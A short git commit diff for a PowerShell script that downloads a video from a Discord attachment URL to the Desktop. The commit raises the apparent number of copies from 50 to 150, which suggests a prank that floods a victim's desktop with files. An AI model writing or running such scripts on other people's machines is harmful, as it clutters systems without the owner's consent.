186b160f9c8212f4e1e110076371ccb36b5d8956
Best Cat <139585282+Sqttyxsq@users.noreply.github.com>
2024-06-02 17:44:44 +0200

    Update aaa.ps1

--- aaa.ps1
+++ aaa.ps1
@@ -1,6 +1,6 @@
 $desktopPath = [System.Environment]::GetFolderPath('Desktop')
 $url = 'https://cdn.discordapp.com/attachments/1149399740652466267/1167554693820600400/VID-20231004-WA0002.mp4?ex=665cd08b&is=665b7f0b&hm=a89cced083bb2c0dc3dfd5f5846e94bf144acc21eec47d8b178ae106b2d43a4f&'  
-$numFiles = 50
+$numFiles = 150
 $originalFileName = "file.mp4"
 
 $downloadedFilePath = Join-Path -Path $desktopPath -ChildPath $originalFileName
